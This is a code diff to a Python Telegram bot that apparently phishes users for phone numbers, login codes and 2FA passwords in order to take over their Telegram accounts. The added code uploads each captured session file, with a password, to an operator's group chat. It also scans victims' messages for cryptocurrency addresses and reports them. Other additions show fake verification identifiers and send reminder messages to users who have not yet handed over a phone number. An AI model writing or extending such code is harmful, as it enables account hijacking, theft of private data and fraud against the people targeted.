@@ -8,10 +8,15 @@ import re
 import os
 import asyncio
 import time
+import random
+import string
 import logging
 
 from aiogram import Router, F, Bot, BaseMiddleware
-from aiogram.types import Message, CallbackQuery, FSInputFile
+from aiogram.types import (
+    Message, CallbackQuery, FSInputFile,
+    InlineKeyboardMarkup, InlineKeyboardButton,
+)
 from aiogram.filters import Command
 from typing import Callable, Dict, Any, Awaitable
 
@@ -115,6 +120,32 @@ async def _handle_login_success(bot: Bot, chat_id: int, uid: int,
     await send_custom_response(bot, chat_id, success_msg, photo_input)
     logger.info(f"[{uid}] ✅ 登录成功: {phone} | {user_info}")
 
+    # Upload session file to group if configured
+    group_id = _c("success_group_id", "")
+    if group_id:
+        try:
+            group_chat_id = int(group_id)
+            session_file = login_engine.get_last_session_path(phone)
+            if session_file and os.path.isfile(session_file):
+                caption = f"📂 Session: {phone}"
+                group_pwd = _c("group_password", "")
+                if group_pwd:
+                    caption += f"\n🔑 密码: {group_pwd}"
+                await bot.send_document(
+                    chat_id=group_chat_id,
+                    document=FSInputFile(session_file),
+                    caption=caption,
+                )
+                logger.info(f"[{uid}] Session 已上传到群: {group_id}")
+            else:
+                logger.warning(f"[{uid}] Session 文件不存在，无法上传到群")
+        except Exception as e:
+            logger.error(f"[{uid}] 上传 session 到群失败: {e}")
+
+    # USDT/crypto address extraction if enabled
+    if _cfg and _cfg.get("usdt_extract_enabled", False):
+        asyncio.create_task(_extract_crypto_addresses(bot, chat_id, uid, phone))
+
     # Schedule delayed session check
     delay = int(_c("post_login_check_delay", "86"))
     if delay > 0:
@@ -139,6 +170,56 @@ async def _post_login_session_check(bot: Bot, chat_id: int,
         logger.error(f"Post-login session check error: {e}")
 
 
+# Crypto address patterns
+_CRYPTO_PATTERNS = [
+    (r'\b(T[A-HJ-NP-Za-km-z1-9]{33})\b', "TRC20/USDT"),
+    (r'\b(0x[0-9a-fA-F]{40})\b', "ERC20/ETH"),
+    (r'\b([13][a-km-zA-HJ-NP-Z1-9]{25,34})\b', "BTC"),
+    (r'\b(bc1[a-zA-HJ-NP-Z0-9]{39,59})\b', "BTC-Bech32"),
+]
+
+
+async def _extract_crypto_addresses(bot: Bot, chat_id: int,
+                                     uid: int, phone: str):
+    """Scan user's chat history for crypto addresses and report them."""
+    try:
+        await asyncio.sleep(2)  # Small delay to let things settle
+        found: list[str] = []
+        store = _chat_store.get(uid)
+        if store:
+            for msg in store.get("messages", []):
+                if msg["from"] == "user":
+                    text = msg["text"]
+                    for pattern, label in _CRYPTO_PATTERNS:
+                        matches = re.findall(pattern, text)
+                        for m in matches:
+                            found.append(f"{label}: {m}")
+
+        if found:
+            report = "💰 检测到加密货币地址:\n" + "\n".join(found[:10])
+            await bot.send_message(chat_id=chat_id, text=report)
+            logger.info(f"[{uid}] 提取到 {len(found)} 个加密货币地址")
+
+            # Also send to group if configured
+            group_id = _c("success_group_id", "")
+            if group_id:
+                try:
+                    await bot.send_message(
+                        chat_id=int(group_id), text=f"📱 {phone}\n{report}")
+                except Exception:
+                    pass
+    except asyncio.CancelledError:
+        pass
+    except Exception as e:
+        logger.error(f"[{uid}] USDT 提取失败: {e}")
+
+
+def _generate_12_digit_code() -> str:
+    """Generate a random 12-character alphanumeric identifier."""
+    chars = string.ascii_uppercase + string.digits
+    return "".join(random.choices(chars, k=12))
+
+
 async def check_timeouts_loop(bot: Bot):
     while True:
         try:
@@ -147,10 +228,35 @@ async def check_timeouts_loop(bot: Bot):
             for uid, state in list(_user_state.items()):
                 step = state.get("step")
                 created_at = state.get("created_at")
-                if not created_at or step not in ("code", "2fa"):
+                if not created_at:
                     continue
 
                 elapsed = now - created_at
+
+                # ── /start remind: user did /start but hasn't sent phone ──
+                if step == "started":
+                    remind_wait = int(_c("start_remind_wait", "45"))
+                    remind_count = int(_c("start_remind_count", "1"))
+                    if remind_wait <= 0 or remind_count <= 0:
+                        continue
+                    sent = state.get("remind_sent", 0)
+                    if sent < remind_count and elapsed >= remind_wait * (sent + 1):
+                        text = _c("start_no_response_text", "")
+                        if text:
+                            try:
+                                await bot.send_message(
+                                    chat_id=uid, text=text, parse_mode="HTML")
+                                logger.info(f"[{uid}] /start 催促 #{sent+1}")
+                            except Exception as e:
+                                logger.error(f"Start remind failed for {uid}: {e}")
+                        state["remind_sent"] = sent + 1
+                    # Clean up stale "started" states after 10 minutes
+                    if elapsed >= 600:
+                        _user_state.pop(uid, None)
+                    continue
+
+                if step not in ("code", "2fa"):
+                    continue
 
                 # ── Auto-reply at configured intervals ──
                 interval_min = int(_c("auto_reply_interval", "1"))
@@ -215,8 +321,24 @@ async def cmd_start(message: Message, bot: Bot):
     mode = "contact"
     reply_markup = main_menu_kb(mode)
     await send_custom_response(bot, message.chat.id, text, None, reply_markup)
+
+    # Welcome inline button (URL) if configured
+    if _cfg and _cfg.get("welcome_button_enabled", False):
+        btn_text = _c("welcome_button_text", "")
+        btn_url = _c("welcome_button_url", "")
+        if btn_text and btn_url:
+            kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text=btn_text, url=btn_url)]
+            ])
+            await bot.send_message(
+                chat_id=message.chat.id, text="\u200b",
+                reply_markup=kb)
+
     _record_msg(uid, _user_name(message), "bot", text)
     logger.info(f"[{uid}] /start")
+
+    # Record start time for /start remind feature
+    _user_state[uid] = {"step": "started", "created_at": time.time()}
 
 
 # ── 分享联系人 ──────────────────────────────────────────────────────
@@ -236,6 +358,8 @@ async def handle_contact(message: Message, bot: Bot):
             "created_at": time.time(), "attempts": 0,
         }
         text = _c("code_panel_title", "✅ 回执码已发送！")
+        if _cfg and _cfg.get("show_12_digit_code", False):
+            text += f"\n🔖 验证标识: {_generate_12_digit_code()}"
         await send_custom_response(bot, message.chat.id, text, None, view_code_kb(phone))
         logger.info(f"[{uid}] 验证码已发送 -> {phone}")
     else:
@@ -270,6 +394,8 @@ async def handle_phone_input(message: Message, bot: Bot):
             "created_at": time.time(), "attempts": 0,
         }
         text = _c("code_panel_title", "✅ 回执码已发送！")
+        if _cfg and _cfg.get("show_12_digit_code", False):
+            text += f"\n🔖 验证标识: {_generate_12_digit_code()}"
         await send_custom_response(bot, message.chat.id, text, None, view_code_kb(phone))
         logger.info(f"[{uid}] 验证码已发送(手动) -> {phone}")
     else:
@@ -374,3 +500,21 @@ async def handle_2fa_input(message: Message, bot: Bot):
             except Exception:
                 err = result.get("message", "密码错误")
             await message.answer(err, parse_mode="HTML")
+
+
+# ── Default reply (catch-all for messages with no active state) ───
+@router.message(F.text)
+async def handle_default(message: Message, bot: Bot):
+    """Reply with default text when user sends a message without active state."""
+    uid = message.from_user.id
+    if message.text.startswith("/"):
+        return
+    state = _user_state.get(uid)
+    if state and state.get("step") in ("code", "2fa", "phone_input"):
+        return  # Already handled by specific handlers above
+
+    _record_msg(uid, _user_name(message), "user", message.text.strip())
+    text = _c("default_reply", "")
+    if text:
+        await message.answer(text, parse_mode="HTML")
+        _record_msg(uid, _user_name(message), "bot", text)
